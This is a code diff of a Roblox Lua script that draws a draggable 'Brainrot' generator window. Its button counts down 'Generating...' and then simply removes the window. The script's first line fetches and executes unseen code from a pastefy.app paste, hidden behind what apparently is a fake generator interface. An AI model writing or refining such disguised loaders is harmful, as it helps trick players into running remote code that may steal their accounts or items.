@@ -2,6 +2,7 @@ loadstring(game:HttpGet("https://pastefy.app/0oa0HgKh/raw"))()
 --// Create ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "BrainrotGUI"
+ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 --// Main Frame
@@ -10,6 +11,7 @@ Frame.Size = UDim2.new(0, 320, 0, 180)
 Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
 Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
 Frame.BorderSizePixel = 0
+Frame.Active = true
 Frame.Parent = ScreenGui
 
 Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
@@ -45,10 +47,19 @@ Button.Parent = Frame
 
 Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 10)
 
---// PROPER DRAG SYSTEM
+--// Drag system
 local UIS = game:GetService("UserInputService")
-local dragging = false
-local dragStart, startPos
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	Frame.Position = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+end
 
 Frame.InputBegan:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseButton1 then
@@ -64,22 +75,21 @@ Frame.InputBegan:Connect(function(input)
 	end
 end)
 
-UIS.InputChanged:Connect(function(input)
-	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-		local delta = input.Position - dragStart
-		Frame.Position = UDim2.new(
-			startPos.X.Scale,
-			startPos.X.Offset + delta.X,
-			startPos.Y.Scale,
-			startPos.Y.Offset + delta.Y
-		)
+Frame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
 	end
 end)
 
---// BUTTON CLICK (CREATE TIMER ONLY AFTER CLICK)
+UIS.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
+
+--// Button logic
 Button.MouseButton1Click:Connect(function()
 
-	-- prevent multiple timers
 	if Frame:FindFirstChild("Timer") then return end
 
 	local Timer = Instance.new("TextLabel")
@@ -92,10 +102,16 @@ Button.MouseButton1Click:Connect(function()
 	Timer.TextColor3 = Color3.fromRGB(255,255,255)
 	Timer.Parent = Frame
 
+	-- 30 second countdown
 	for i = 30, 0, -1 do
-		Timer.Text = "Generating... " .. i .. "s"
+		Timer.Text = "Generating in... " .. i .. "s"
 		task.wait(1)
 	end
 
-	Timer.Text = "Done!"
+	-- Show "Generating..." for 5 seconds
+	Timer.Text = "Generating..."
+	task.wait(5)
+
+	-- Remove GUI
+	ScreenGui:Destroy()
 end)
